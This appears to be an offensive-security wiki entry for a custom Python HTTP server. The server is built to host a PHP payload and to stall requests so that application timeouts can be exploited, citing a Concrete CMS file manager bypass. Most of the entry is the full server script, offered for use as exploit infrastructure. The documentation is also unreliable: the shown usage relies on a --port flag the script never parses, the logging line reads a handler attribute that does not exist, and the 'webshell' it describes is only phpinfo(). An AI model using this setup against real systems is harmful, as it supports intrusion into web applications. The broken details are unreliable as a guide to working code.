---
url: null
tags:
  - http-server
  - custom-tool
type: tool
platforms:
  - Linux
description: >-
  Custom Python script implementing an HTTP server for hosting payloads and
  inducing delays in target applications.
id: f89a8a8d-089f-4109-ba7c-3e4559402f90
created_at: '2025-12-14T17:23:27.963Z'
updated_at: '2025-12-14T17:23:27.963Z'
verified: false
validated: true
submitted: true
---
# Custom-Python-HTTP-Server

**Status**: Unverified

## Overview

A lightweight Python-based HTTP server designed for offensive security, specifically to serve malicious files like PHP webshells and respond with artificial delays to exploit application timeouts.

## Description

This tool uses Python's http.server module extended with custom handlers: serves a PHP payload at /byc.php and sleeps 10 seconds on /stuck requests. It's ideal for scenarios requiring controlled request handling during web app exploitation, such as the Concrete CMS file manager bypass.

## Features

- Feature 1: Serves static PHP webshell content
- Feature 2: Configurable delay responses for timeout induction
- Feature 3: Request logging with timestamps for monitoring

## Installation

### Requirements

- Python 3.x
- No external dependencies

### Install Commands

```bash
# Create server.py with custom code
cat > server.py << EOF
#!/usr/bin/env python3
import http.server
import socketserver
import time

PORT = 8877
EXPLOIT = '<?php phpinfo(); ?>'

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/byc.php':
            self.send_response(200)
            self.send_header('Content-type', 'application/x-php')
            self.end_headers()
            self.wfile.write(EXPLOIT.encode())
        elif self.path == '/stuck':
            time.sleep(10)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Delayed response')
        else:
            super().do_GET()
        print(f'{time.ctime()}: {self.requestline} {self.status}')

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f'Server listening on port {PORT}')
    httpd.serve_forever()
EOF
chmod +x server.py
```

## Basic Usage

```bash
python3 server.py
```

### Common Options

| Option | Description |
|--------|-------------|
| `--port` | Specify listening port |

## Examples

### Example 1: Basic Usage

```bash
python3 server.py --port 8877
```

### Example 2: Advanced Usage

```bash
# Run with custom port
python3 server.py --port 8080
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Remote File Copy]]
- [[Python]]

### Tactics

- [[Execution]]

## Detection

Indicators and methods for detecting this tool's usage:

- Unusual Python processes listening on non-standard ports
- Outbound connections to the server from web apps
- Logs showing delayed HTTP responses

## Related Procedures

- [[procedures/Set-Up-Malicious-HTTP-Server]]

## Related Tools

- [[Python http.server]]

## References

- Python http.server documentation
